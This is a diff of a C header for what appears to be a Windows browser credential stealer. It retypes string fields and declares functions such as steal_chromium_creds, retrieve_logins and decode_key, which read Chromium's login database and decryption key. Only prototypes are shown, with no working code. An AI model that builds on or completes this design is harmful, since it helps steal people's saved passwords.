@@ -2,18 +2,19 @@
 #define CHROMIUM_H
 
 #include <windows.h>
+#include <winnt.h>
 
 #include "logins.h"
 
 typedef struct {
-  PCWSTR browserName;
-  PCWSTR loginDataPath;
-  PCWSTR localStatePath;
+  PWSTR browserName;
+  PWSTR loginDataPath;
+  PWSTR localStatePath;
 } BrowserInfo;
 
 int steal_chromium_creds();
 static int steal_browser_creds(BrowserInfo browser);
-static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
+static int retrieve_logins(PWSTR fullPath, int *loginCountOut,
                            Login *loginsOut[]);
 static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encryptedKeyOut);
 static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
